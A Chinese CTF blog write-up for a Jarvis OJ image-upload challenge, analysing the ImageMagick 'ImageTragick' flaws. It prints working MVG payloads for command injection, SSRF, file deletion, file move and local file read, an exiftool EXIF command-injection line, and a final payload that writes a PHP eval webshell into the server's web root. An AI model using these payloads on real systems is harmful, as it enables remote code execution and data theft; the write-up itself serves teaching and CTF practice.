@@ -1,0 +1,1420 @@
+<!DOCTYPE html>
+
+<script type="text/javascript" color="0,0,255" opacity="0.7" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/Adolph.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Adolph.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Adolph.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/Adolph.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="图片上传,jarvisoj,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目地址:http://web.jarvisoj.com:32790 jarvisoj-图片上传漏洞_writeup先分享一下自己的思路对现在的web题，我个人通常采用的思路是，先进行目录以及其他敏感信息进行收集的同时进行手工测试。当下的web漏洞多是复合漏洞的利用，依靠单一漏洞capture flag的题目非常的少。而最常使用的结合就是phpinfo，.git,.svn等敏感配置文件或者源码文件">
+<meta name="keywords" content="图片上传,jarvisoj">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj-图片上传漏洞_writeup以及imagick漏洞分析">
+<meta property="og:url" content="https://www.zzh.pub/2018/08/17/jarvisoj-图片上传漏洞-writeup/index.html">
+<meta property="og:site_name" content="Adolph">
+<meta property="og:description" content="题目地址:http://web.jarvisoj.com:32790 jarvisoj-图片上传漏洞_writeup先分享一下自己的思路对现在的web题，我个人通常采用的思路是，先进行目录以及其他敏感信息进行收集的同时进行手工测试。当下的web漏洞多是复合漏洞的利用，依靠单一漏洞capture flag的题目非常的少。而最常使用的结合就是phpinfo，.git,.svn等敏感配置文件或者源码文件">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/xdGd1WL.png">
+<meta property="og:image" content="https://i.imgur.com/DETfwsc.png">
+<meta property="og:updated_time" content="2018-09-15T16:24:44.395Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="jarvisoj-图片上传漏洞_writeup以及imagick漏洞分析">
+<meta name="twitter:description" content="题目地址:http://web.jarvisoj.com:32790 jarvisoj-图片上传漏洞_writeup先分享一下自己的思路对现在的web题，我个人通常采用的思路是，先进行目录以及其他敏感信息进行收集的同时进行手工测试。当下的web漏洞多是复合漏洞的利用，依靠单一漏洞capture flag的题目非常的少。而最常使用的结合就是phpinfo，.git,.svn等敏感配置文件或者源码文件">
+<meta name="twitter:image" content="https://i.imgur.com/xdGd1WL.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.zzh.pub/2018/08/17/jarvisoj-图片上传漏洞-writeup/">
+
+
+
+
+
+  <title>jarvisoj-图片上传漏洞_writeup以及imagick漏洞分析 | Adolph</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Adolph</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">助他人,己莫记</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-forensic">
+          <a href="/categories/Forensic/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            Forensic
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-ctf">
+          <a href="/categories/CTF/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br>
+            
+            CTF
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/Kali/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user-secret"></i> <br>
+            
+            Kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/Web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br>
+            
+            Web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-misc">
+          <a href="/categories/Misc/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-key"></i> <br>
+            
+            隐写术
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-cryptology">
+          <a href="/categories/Cryptology/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-lock"></i> <br>
+            
+            密码学
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-ope">
+          <a href="/categories/Ope/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-university"></i> <br>
+            
+            服务器运维
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.zzh.pub/2018/08/17/jarvisoj-图片上传漏洞-writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Adolph">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Adolph.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Adolph">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">jarvisoj-图片上传漏洞_writeup以及imagick漏洞分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-17T15:43:00+08:00">
+                2018-08-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,923
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>题目地址:<a href="http://web.jarvisoj.com:32790" target="_blank" rel="noopener">http://web.jarvisoj.com:32790</a></p>
+<h1 id="jarvisoj-图片上传漏洞-writeup"><a href="#jarvisoj-图片上传漏洞-writeup" class="headerlink" title="jarvisoj-图片上传漏洞_writeup"></a>jarvisoj-图片上传漏洞_writeup</h1><h1 id="先分享一下自己的思路"><a href="#先分享一下自己的思路" class="headerlink" title="先分享一下自己的思路"></a>先分享一下自己的思路</h1><p>对现在的web题，我个人通常采用的思路是，先进行目录以及其他敏感信息进行收集的同时进行手工测试。当下的web漏洞多是复合漏洞的利用，依靠单一漏洞capture flag的题目非常的少。而最常使用的结合就是phpinfo，.git,.svn等敏感配置文件或者源码文件的泄露结合题目的主要漏洞进行利用。这样的题目一来是避免了web的脑洞，二来也考察了做题人的基础水平以及利用基础性文件对漏洞的挖掘<br><a id="more"></a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>我个人通常直接采用目录扫描工具的结合性扫描对网站的敏感文件进行自动化收集，扫描的同时进行手工测试，这里主要以该题进行说明。</p>
+<p>同时在windows下和kali中使用工具进行结合扫描。在windows下使用御剑或者pk等对目录扫描，kali中使用dirb命令进行扫描。</p>
+<p><img src="https://i.imgur.com/xdGd1WL.png" alt=""></p>
+<p><img src="https://i.imgur.com/DETfwsc.png" alt=""></p>
+<p>可以发现除了上传口之外还有一个test.php，访问可发现是一个phpinfo的页面，然后进行快速分析，可以发现imagick的php拓展，因为该题以图片上传漏洞为主要背景，所以势必主要突破口还是在图片上，在刚刚的扫描时的手工测试，对上传口进行正常图片上传，木马伪装图片上传，修改mime类型，修改图片类型等变换的手工测试均失败，所以这题的上传漏洞主要漏洞势必不是在图片的上传绕过方面，主要问题可能在php第三方的拓展imagick对图片的处理过程中产生漏洞。</p>
+<h1 id="imagick漏洞分析"><a href="#imagick漏洞分析" class="headerlink" title="imagick漏洞分析"></a>imagick漏洞分析</h1><p>由于对imagick只有一个肤浅的了解，参考网上资料<a href="https://www.anquanke.com/post/id/83872，https://www.2cto.com/article/201605/505823.html，两篇文章对该漏洞进行学习。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/83872，https://www.2cto.com/article/201605/505823.html，两篇文章对该漏洞进行学习。</a></p>
+<p>其中有关imagick漏洞主要有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717。</p>
+<p>imagick是一个使用非常广泛的图片处理软件。</p>
+<p>在ImageMagick/delegates.xml中(delegare时调用外部lib来处理文件，其过程中调用system()命令进行执行)配置如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?--&gt;</span><br><span class="line">&lt;!--ELEMENT delegate (#PCDATA)--&gt;</span><br><span class="line">&lt;!--ATTLIST delegate decode CDATA #IMPLIED--&gt;</span><br><span class="line">&lt;!--ATTLIST delegate encode CDATA #IMPLIED--&gt;</span><br><span class="line">&lt;!--ATTLIST delegate mode CDATA #IMPLIED--&gt;</span><br><span class="line">&lt;!--ATTLIST delegate spawn CDATA #IMPLIED--&gt;</span><br><span class="line">&lt;!--ATTLIST delegate stealth CDATA #IMPLIED--&gt;</span><br><span class="line">&lt;!--ATTLIST delegate thread-support CDATA #IMPLIED--&gt;</span><br><span class="line">&lt;!--ATTLIST delegate command CDATA #REQUIRED--&gt;</span><br><span class="line">&lt;!--  Delegate command file.  Commands which specify    decode=&quot;in_format&quot; encode=&quot;out_format&quot;  specify the rules for converting from in_format to out_format These  rules may be used to translate directly between formats.  Commands which specify only    decode=&quot;in_format&quot;  specify the rules for converting from in_format to some format that  ImageMagick will automatically recognize. These rules are used to  decode formats.  Commands which specify only   encode=&quot;out_format&quot;  specify the rules for an &quot;encoder&quot; which may accept any input format.  For delegates other than ps:*, pcl:*, and mpeg:* the substitution rules are  as follows:    %i  input image filename    %o  output image filename    %u  unique temporary filename    %Z  unique temporary filename    %#  input image signature    %b  image file size    %c  input image comment    %g  image geometry    %h  image rows (height)    %k  input image number colors    %l  image label    %m  input image format    %p  page number    %q  input image depth    %s  scene number    %w  image columns (width)    %x  input image x resolution    %y  input image y resolution  Set option delegate:bimodal=true to process bimodal delegates otherwise they  are ignored.  If stealth=&quot;True&quot; the delegate is not listed in user requested  &quot;-list delegate&quot; listings. These are typically special internal delegates.  If spawn=&quot;True&quot; ImageMagick will not way for the delegate to finish,  nor will it read any output image.  It will only wait for either the input  file to be removed (See &quot;ephemeral:&quot; coder) indicating that the input file  has been read, or a maximum time limit of 2 seconds.--&gt;</span><br><span class="line">&lt;delegatemap&gt;</span><br><span class="line">    &lt;delegate command=&quot;&quot; decode=&quot;autotrace&quot; pnm=&quot;&quot; stealth=&quot;True&quot; svg=&quot;&quot;&gt;</span><br><span class="line">        &lt;delegate command=&quot;&quot; decode=&quot;cdr&quot; delegate=&quot;&quot; http:=&quot;&quot; mv=&quot;&quot; png=&quot;&quot; ps=&quot;&quot; rm=&quot;&quot; spawn=&quot;True&quot; stealth=&quot;True&quot; www.imagemagick.org=&quot;&quot;&gt;&quot;%o&quot; 2&amp;gt; &quot;%Z&quot;&quot; decode=&quot;cgm&quot; thread-support=&quot;False&quot;&amp;gt; </span><br><span class="line">        &lt;delegate command=&quot;&quot; decode=&quot;dvi&quot;&gt;</span><br><span class="line">            &lt;delegate alternatives=&quot;&quot; color=&quot;&quot; command=&quot;&quot; decode=&quot;fig&quot; delegate=&quot;&quot; edit=&quot;&quot; encode=&quot;ps&quot; etc=&quot;&quot; image=&quot;&quot; load=&quot;&quot; mode=&quot;bi&quot; output=&quot;&quot; portrait=&quot;&quot; postscript=&quot;&quot; ps=&quot;&quot; set=&quot;&quot; size=&quot;&quot; stealth=&quot;True&quot; terminal=&quot;&quot; vi=&quot;&quot;&gt;&quot;%u&quot;;&quot;gnuplot&quot; &quot;%u&quot;&quot; decode=&quot;plt&quot;&amp;gt; </span><br><span class="line">            &lt;delegate basename=&quot;&quot; command=&quot;&quot; decode=&quot;hpg&quot; eps=&quot;&quot; mv=&quot;&quot;&gt;</span><br><span class="line">                &lt;delegate basename=&quot;&quot; command=&quot;if [ -e hp2xx -o -e /usr/bin/hp2xx ]; then hp2xx -q -m eps -f `basename&quot; decode=&quot;hpgl&quot; echo=&quot;&quot; else=&quot;&quot; exit=&quot;&quot; files=&quot;&quot; hp2xx=&quot;&quot; hpgl=&quot;&quot; install=&quot;&quot; mv=&quot;&quot; need=&quot;&quot; to=&quot;&quot; use=&quot;&quot; with=&quot;&quot; you=&quot;&quot;&gt;</span><br><span class="line">                    &lt;delegate command=&quot;&quot; decode=&quot;htm&quot;&gt;</span><br><span class="line">                        &lt;delegate command=&quot;&quot; decode=&quot;html&quot;&gt;</span><br><span class="line">                            &lt;delegate command=&quot;&quot; decode=&quot;https&quot;&gt;</span><br><span class="line">                                &lt;delegate command=&quot;&quot; decode=&quot;pcl:color&quot; delegate=&quot;&quot; encode=&quot;mpeg:encode&quot; pam=&quot;&quot; rawvideo=&quot;&quot; rd=&quot;&quot; s=&quot;&quot; sid=&quot;&quot; stealth=&quot;True&quot; tif=&quot;&quot;&gt;</span><br><span class="line">                                    &lt;delegate command=&quot;&quot; decode=&quot;pcl:cmyk&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                        &lt;delegate command=&quot;&quot; decode=&quot;pcl:mono&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                            &lt;delegate command=&quot;&quot; decode=&quot;pdf&quot; encode=&quot;eps&quot; mode=&quot;bi&quot;&gt;</span><br><span class="line">                                                &lt;delegate command=&quot;&quot; decode=&quot;pdf&quot; encode=&quot;ps&quot; mode=&quot;bi&quot;&gt;</span><br><span class="line">                                                    &lt;delegate command=&quot;&quot; decode=&quot;tiff&quot; encode=&quot;launch&quot; mode=&quot;encode&quot;&gt;</span><br><span class="line">                                                        &lt;delegate a=&quot;&quot; command=&quot;&quot; decode=&quot;pov&quot; delegate=&quot;&quot; encode=&quot;ilbm&quot; h=&quot;&quot; mode=&quot;encode&quot; q=&quot;&quot; w=&quot;&quot;&gt;</span><br><span class="line">                                                            &lt;delegate command=&quot;&quot; decode=&quot;ps&quot; encode=&quot;eps&quot; mode=&quot;bi&quot;&gt;</span><br><span class="line">                                                                &lt;delegate command=&quot;&quot; decode=&quot;ps&quot; encode=&quot;pdf&quot; mode=&quot;bi&quot;&gt;</span><br><span class="line">                                                                    &lt;delegate command=&quot;lpr&quot; decode=&quot;ps&quot; encode=&quot;print&quot; mode=&quot;encode&quot;&gt;</span><br><span class="line">                                                                        &lt;delegate command=&quot;&quot; decode=&quot;ps:alpha&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                                                            &lt;delegate command=&quot;&quot; decode=&quot;ps:cmyk&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                                                                &lt;delegate command=&quot;&quot; decode=&quot;ps:color&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                                                                    &lt;delegate command=&quot;&quot; decode=&quot;ps:mono&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                                                                        &lt;delegate command=&quot;&quot; decode=&quot;rgba&quot; encode=&quot;rle&quot; mode=&quot;encode&quot;&gt;</span><br><span class="line">                                                                                            &lt;delegate bin=&quot;&quot; command=&quot;&quot; decode=&quot;miff&quot; delegate=&quot;&quot; encode=&quot;show&quot; l=&quot;&quot; spawn=&quot;True&quot; usr=&quot;&quot;&gt;</span><br><span class="line">                                                                                                &lt;delegate command=&quot;&quot; decode=&quot;shtml&quot;&gt;</span><br><span class="line">                                                                                                    &lt;delegate command=&quot;&quot; decode=&quot;svg&quot;&gt;</span><br><span class="line">                                                                                                        &lt;delegate command=&quot;&quot; decode=&quot;txt&quot; encode=&quot;ps&quot; mode=&quot;bi&quot;&gt;</span><br><span class="line">                                                                                                            &lt;delegate bin=&quot;&quot; command=&quot;&quot; decode=&quot;miff&quot; encode=&quot;win&quot; l=&quot;&quot; spawn=&quot;True&quot; stealth=&quot;True&quot; usr=&quot;&quot;&gt;</span><br><span class="line">                                                                                                                &lt;delegate command=&quot;&quot; decode=&quot;wmf&quot;&gt;</span><br><span class="line">                                                                                                                    &lt;delegate command=&quot;&quot; decode=&quot;xps:color&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                                                                                                        &lt;delegate command=&quot;&quot; decode=&quot;xps:cmyk&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;</span><br><span class="line">                                                                                                                            &lt;delegate command=&quot;&quot; decode=&quot;xps:mono&quot; s=&quot;&quot; stealth=&quot;True&quot;&gt;&lt;/delegate&gt;</span><br><span class="line">                                                                                                                        &lt;/delegate&gt;</span><br><span class="line">                                                                                                                    &lt;/delegate&gt;</span><br><span class="line">                                                                                                                &lt;/delegate&gt;</span><br><span class="line">                                                                                                            &lt;/delegate&gt;</span><br><span class="line">                                                                                                        &lt;/delegate&gt;</span><br><span class="line">                                                                                                    &lt;/delegate&gt;</span><br><span class="line">                                                                                                &lt;/delegate&gt;</span><br><span class="line">                                                                                            &lt;/delegate&gt;</span><br><span class="line">                                                                                        &lt;/delegate&gt;</span><br><span class="line">                                                                                    &lt;/delegate&gt;</span><br><span class="line">                                                                                &lt;/delegate&gt;</span><br><span class="line">                                                                            &lt;/delegate&gt;</span><br><span class="line">                                                                        &lt;/delegate&gt;</span><br><span class="line">                                                                    &lt;/delegate&gt;</span><br><span class="line">                                                                &lt;/delegate&gt;</span><br><span class="line">                                                            &lt;/delegate&gt;</span><br><span class="line">                                                        &lt;/delegate&gt;</span><br><span class="line">                                                    &lt;/delegate&gt;</span><br><span class="line">                                                &lt;/delegate&gt;</span><br><span class="line">                                            &lt;/delegate&gt;</span><br><span class="line">                                        &lt;/delegate&gt;</span><br><span class="line">                                    &lt;/delegate&gt;</span><br><span class="line">                                &lt;/delegate&gt;</span><br><span class="line">                            &lt;/delegate&gt;</span><br><span class="line">                        &lt;/delegate&gt;</span><br><span class="line">                    &lt;/delegate&gt;</span><br><span class="line">                &lt;/delegate&gt;</span><br><span class="line">            &lt;/delegate&gt;&lt;/delegate&gt;</span><br><span class="line">        &lt;/delegate&gt;&lt;/delegate&gt;</span><br><span class="line">    &lt;/delegate&gt;</span><br><span class="line">&lt;/delegatemap&gt;</span><br></pre></td></tr></table></figure>
+<p>%i  input image filename </p>
+<p>%o  output image filename </p>
+<p>%u  unique temporary filename  </p>
+<p>%Z  unique temporary filename   </p>
+<p>%#  input image signature   </p>
+<p>%b  image file size    </p>
+<p>%c  input image comment  </p>
+<p>%g  image geometry    </p>
+<p>%h  image rows (height)  </p>
+<p>%k  input image number colors </p>
+<p>%l  image label    </p>
+<p>%m  input image format </p>
+<p>%p  page number    </p>
+<p>%q  input image depth   </p>
+<p>%s  scene number    </p>
+<p>%w  image columns (width) </p>
+<p>%x  input image x resolution </p>
+<p>%y  input image y resolution<br>以上为该配置文件中对占位符的说明，其中根据资料的poc：<delegate -k="" -o="" -s="" command="" decode="https"></delegate>该漏洞的主要问题出在采用占位符进行简单的拼接造成引号闭合执行系统命令。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="CVE-2016-3714"><a href="#CVE-2016-3714" class="headerlink" title="CVE-2016-3714"></a>CVE-2016-3714</h2><p>解析https图片的时候，使用了curl命令将其下载，我们看到%M被直接放在curl的最后一个参数内。ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。</p>
+<p>push graphic-context</p>
+<p>viewbox 0 0 640 480</p>
+<p>fill ‘url(https://“|id; “)’</p>
+<p>pop graphic-context</p>
+<h2 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h2><p>利用mvg格式中可以包含url的特点，进行SSRF攻击</p>
+<p>push graphic-context</p>
+<p>viewbox 0 0 640 480</p>
+<p>fill ‘url(<a href="https://example.com/)&#39;" target="_blank" rel="noopener">https://example.com/)&#39;</a></p>
+<p>pop graphic-context</p>
+<h2 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h2><p>利用ImageMagick支持的ephemeral协议，来删除任意文件</p>
+<p>push graphic-context</p>
+<p>viewbox 0 0 640 480</p>
+<p>image over 0,0 0,0 ‘ephemeral:/tmp/delete.txt’</p>
+<p>pop graphic-context</p>
+<h2 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h2><p>利用ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell。</p>
+<p>file_move.mvg</p>
+<p>push graphic-context</p>
+<p>viewbox 0 0 640 480</p>
+<p>image over 0,0 0,0 ‘msl:/tmp/msl.txt’popgraphic-context/tmp/msl.txt</p>
+<!--?xml version="1.0" encoding="UTF-8"?-->
+<h2 id="CVE-2016-3717本地文件读取"><a href="#CVE-2016-3717本地文件读取" class="headerlink" title="CVE-2016-3717本地文件读取"></a>CVE-2016-3717本地文件读取</h2><p>push graphic-context</p>
+<p>viewbox 0 0 640 480</p>
+<p>image over 0,0 0,0 ‘label:@/etc/hosts’</p>
+<p>pop graphic-context</p>
+<h2 id="png格式触发"><a href="#png格式触发" class="headerlink" title="png格式触发"></a>png格式触发</h2><p>exif label处理：<delegate 0="" -delay="" -title="\" -window-group="" bin="" command="" decode="miff" encode="show" l="" spawn="True" usr=""></delegate></p>
+<p>正常的png图片，带上一个『恶意』的exif信息。在调用ImageMagick将其处理成.show文件的时候，即可触发命令注入漏洞。</p>
+<p>exiftool -label=”\”|/usr/bin/id; \”” test.pngconvert test.png o.show</p>
+<p>需要配置encode=“show”或者“win”</p>
+<h2 id="本题突破"><a href="#本题突破" class="headerlink" title="本题突破"></a>本题突破</h2><p>首先尝试前面几种命令执行的漏洞，构造了新突破在其中fill进事先上传的jpg链接进行转换然后执行，发现命令并没有执行，失败了。</p>
+<p>然后发现题目中说最好使用png。联想到png格式触发的漏洞。/home/ctf/flag.txt，然后构造exiftool -label=”\”|/bin/echo \&lt;?php \@eval(\$_POST[x])\;?> &gt; /opt/lampp/htdocs/uploads/haha.php; \”” onein.png修改type为show</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/images/weix.png" alt="Adolph wechat" style="width: 200px; max-width: 100%;">
+    <div>Hint:狗狗隐写，听说微信扫一扫就能交个朋友</div>
+</div>
+
+      </div>
